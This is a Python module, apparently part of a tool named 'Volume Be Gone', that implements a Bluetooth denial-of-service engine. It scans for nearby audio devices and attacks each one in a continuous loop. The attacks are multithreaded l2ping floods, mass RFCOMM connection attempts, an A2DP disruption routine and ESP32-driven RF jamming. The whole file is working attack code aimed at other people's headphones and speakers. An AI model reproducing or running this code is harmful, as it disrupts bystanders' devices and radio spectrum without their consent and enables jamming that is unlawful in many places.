#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Volume Be Gone v3.0 - Motor de Ataques Bluetooth

Gestiona los ataques L2CAP, RFCOMM y coordinación con ESP32.

Author: Francisco Ortiz Rojas
License: MIT
"""

import os
import subprocess
import threading
import time
from typing import Dict, List, Optional, Callable
from .config import config
from .bluetooth_scanner import BluetoothScanner
from .esp32_controller import ESP32Controller


class AttackEngine:
    """
    Motor de ataques Bluetooth.

    Coordina ataques L2CAP, RFCOMM y RF Jamming (ESP32).
    """

    def __init__(self, scanner: BluetoothScanner, esp32: Optional[ESP32Controller] = None):
        self.config = config
        self.scanner = scanner
        self.esp32 = esp32

        self.attacking = False
        self.current_target: Optional[Dict] = None

        # Threads de ataque activos
        self._attack_threads: List[threading.Thread] = []

        # Control
        self._attack_loop_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

        # Callbacks
        self._on_attack_start: Optional[Callable[[Dict], None]] = None
        self._on_attack_end: Optional[Callable[[Dict, bool], None]] = None

    def start_continuous_attack(self):
        """Inicia el loop de ataque continuo"""
        if self._attack_loop_thread and self._attack_loop_thread.is_alive():
            return

        self._stop_event.clear()
        self._attack_loop_thread = threading.Thread(target=self._attack_loop, daemon=True)
        self._attack_loop_thread.start()
        print("[Attack] Loop de ataque iniciado")

    def stop_continuous_attack(self):
        """Detiene el loop de ataque"""
        self._stop_event.set()
        self.attacking = False

        # Detener ESP32 jamming
        if self.esp32 and self.esp32.connected:
            self.esp32.stop_jamming()

        # Matar procesos de ataque
        os.system("pkill -f l2ping")
        os.system("pkill -f rfcomm")

        print("[Attack] Loop de ataque detenido")

    def _attack_loop(self):
        """Loop principal de ataque secuencial"""
        while not self._stop_event.is_set():
            devices = self.scanner.get_all_devices()

            if devices:
                # Filtrar dispositivos de audio
                targets = self.scanner.filter_audio_devices(devices)

                if not targets:
                    print("[Attack] No hay dispositivos de audio para atacar")
                    time.sleep(5)
                    continue

                # Atacar secuencialmente
                for i, device in enumerate(targets):
                    if self._stop_event.is_set():
                        break

                    print(f"\n{'='*60}")
                    print(f"[Attack] {i+1}/{len(targets)}: {device['addr']} - {device.get('name', 'Unknown')}")
                    print(f"{'='*60}")

                    self.attack_device(device)

                    # Delay entre dispositivos
                    if i < len(targets) - 1:
                        delay = self.config.attack.attack_delay_between_devices
                        print(f"[Attack] Esperando {delay}s...")
                        time.sleep(delay)

                print("\n[Attack] Ciclo completado, reiniciando en 5s...")
                time.sleep(5)
            else:
                time.sleep(1)

    def attack_device(self, device: Dict, duration: int = 15) -> bool:
        """
        Ataca un dispositivo con todos los métodos.

        Args:
            device: Diccionario con info del dispositivo
            duration: Duración del ataque en segundos

        Returns:
            bool: True si el ataque fue exitoso
        """
        addr = device['addr']
        name = device.get('name', 'Unknown')

        self.attacking = True
        self.current_target = device

        if self._on_attack_start:
            self._on_attack_start(device)

        print(f"[Attack] ATACANDO: {addr} ({name})")

        try:
            # === FASE 1: Iniciar RF Jamming (si ESP32 disponible) ===
            if self.esp32 and self.esp32.connected:
                print("[Attack] Fase 1: Iniciando RF Jamming...")
                self.esp32.set_pattern(self.esp32.TxPattern.PULSE)
                self.esp32.start_jamming(self.esp32.JamMode.BT)
                time.sleep(2)  # Pre-jamming

            # === FASE 2: Enumerar servicios SDP ===
            rfcomm_channels = []
            if self.config.attack.sdp_enumerate_before_attack:
                rfcomm_channels = self.scanner.enumerate_sdp_services(addr)
            else:
                rfcomm_channels = list(range(1, self.config.attack.rfcomm_max_channels + 1))

            # === FASE 3: L2CAP Ping Flood ===
            print(f"[Attack] Fase 2: L2CAP Flood ({self.config.attack.l2ping_threads_per_device} threads)...")
            self._launch_l2cap_attack(addr)

            # === FASE 4: RFCOMM Saturation ===
            print(f"[Attack] Fase 3: RFCOMM Saturation ({len(rfcomm_channels)} canales)...")
            self._launch_rfcomm_attack(addr, rfcomm_channels)

            # === FASE 5: A2DP/AVDTP Attack ===
            if self.config.attack.a2dp_stream_attacks:
                print("[Attack] Fase 4: A2DP/AVDTP Disruption...")
                self._launch_a2dp_attack(addr)

            # Cambiar ESP32 a modo continuo
            if self.esp32 and self.esp32.connected:
                self.esp32.set_pattern(self.esp32.TxPattern.CONTINUOUS)

            # Esperar duración del ataque
            time.sleep(duration)

            # Detener ESP32
            if self.esp32 and self.esp32.connected:
                self.esp32.stop_jamming()

            success = True

        except Exception as e:
            print(f"[Attack] Error: {e}")
            success = False

        self.attacking = False
        self.current_target = None

        if self._on_attack_end:
            self._on_attack_end(device, success)

        return success

    def _launch_l2cap_attack(self, addr: str):
        """Lanza ataque L2CAP con múltiples threads"""
        bt = self.config.bluetooth.bt_interface

        for i in range(self.config.attack.l2ping_threads_per_device):
            size = self.config.attack.l2ping_package_sizes[i % len(self.config.attack.l2ping_package_sizes)]

            thread = threading.Thread(
                target=self._l2ping_worker,
                args=(addr, size, bt),
                daemon=True
            )
            thread.start()
            self._attack_threads.append(thread)
            time.sleep(0.01)

        # Procesos adicionales
        for _ in range(10):
            try:
                os.system(f'l2ping -i {bt} -s 600 -f {addr} &')
                os.system(f'l2ping -i {bt} -s 800 -f {addr} &')
            except:
                pass

    def _l2ping_worker(self, addr: str, size: int, interface: str):
        """Worker thread para L2CAP ping"""
        try:
            subprocess.run(
                ['l2ping', '-i', interface, '-s', str(size), '-f', '-t', '0', addr],
                timeout=self.config.attack.l2ping_timeout,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass

    def _launch_rfcomm_attack(self, addr: str, channels: List[int]):
        """Lanza ataque RFCOMM a múltiples canales"""
        bt = self.config.bluetooth.bt_interface

        for channel in channels[:self.config.attack.rfcomm_max_channels]:
            thread = threading.Thread(
                target=self._rfcomm_worker,
                args=(addr, channel, bt),
                daemon=True
            )
            thread.start()
            self._attack_threads.append(thread)
            time.sleep(0.01)

    def _rfcomm_worker(self, addr: str, channel: int, interface: str):
        """Worker thread para RFCOMM"""
        try:
            for _ in range(self.config.attack.rfcomm_connections_per_channel):
                subprocess.Popen(
                    ['rfcomm', '-i', interface, 'connect', addr, str(channel)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(0.02)
        except:
            pass

    def _launch_a2dp_attack(self, addr: str):
        """Lanza ataque específico A2DP/AVDTP"""
        bt = self.config.bluetooth.bt_interface

        def a2dp_worker():
            try:
                for _ in range(10):
                    for channel in [1, 3, 25]:
                        subprocess.Popen(
                            ['rfcomm', '-i', bt, 'connect', addr, str(channel)],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )

                    subprocess.Popen(
                        ['l2ping', '-i', bt, '-s', '672', '-f', addr],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    time.sleep(0.1)
            except:
                pass

        thread = threading.Thread(target=a2dp_worker, daemon=True)
        thread.start()
        self._attack_threads.append(thread)

    def attack_hybrid(self, device: Dict) -> bool:
        """
        Ataque híbrido coordinado (BT DoS + RF Jamming).

        Secuencia optimizada para máxima efectividad.
        """
        if not self.esp32 or not self.esp32.connected:
            print("[Attack] ESP32 no disponible, usando ataque BT solo")
            return self.attack_device(device)

        addr = device['addr']
        name = device.get('name', 'Unknown')

        print(f"[Attack] ATAQUE HÍBRIDO: {addr} ({name})")

        try:
            # Fase 1: Pre-jamming (5s)
            print("[Attack] Fase 1: Pre-jamming RF (5s)...")
            self.esp32.set_pattern(self.esp32.TxPattern.PULSE)
            self.esp32.start_jamming(self.esp32.JamMode.BT)
            time.sleep(5)

            # Fase 2: L2CAP + RF continuo (15s)
            print("[Attack] Fase 2: L2CAP + RF (15s)...")
            self.esp32.set_pattern(self.esp32.TxPattern.CONTINUOUS)
            self._launch_l2cap_attack(addr)
            time.sleep(15)

            # Fase 3: RFCOMM + RF pulsos (10s)
            print("[Attack] Fase 3: RFCOMM + RF (10s)...")
            self.esp32.set_pattern(self.esp32.TxPattern.BURST)
            channels = self.scanner.enumerate_sdp_services(addr)
            self._launch_rfcomm_attack(addr, channels)
            time.sleep(10)

            # Detener
            self.esp32.stop_jamming()
            print("[Attack] Ataque híbrido completado")
            return True

        except Exception as e:
            print(f"[Attack] Error en ataque híbrido: {e}")
            if self.esp32:
                self.esp32.stop_jamming()
            return False

    def stop_all_attacks(self):
        """Detiene todos los ataques activos"""
        self.attacking = False
        self._stop_event.set()

        # ESP32
        if self.esp32 and self.esp32.connected:
            self.esp32.stop_jamming()

        # Procesos del sistema
        os.system("pkill -f l2ping")
        os.system("pkill -f rfcomm")

        print("[Attack] Todos los ataques detenidos")

    def on_attack_start(self, callback: Callable[[Dict], None]):
        """Registra callback para inicio de ataque"""
        self._on_attack_start = callback

    def on_attack_end(self, callback: Callable[[Dict, bool], None]):
        """Registra callback para fin de ataque"""
        self._on_attack_end = callback

    def get_status(self) -> dict:
        """Obtiene estado del motor de ataques"""
        return {
            'attacking': self.attacking,
            'current_target': self.current_target,
            'active_threads': len([t for t in self._attack_threads if t.is_alive()]),
            'esp32_connected': self.esp32.connected if self.esp32 else False,
            'esp32_jamming': self.esp32.jamming if self.esp32 else False
        }
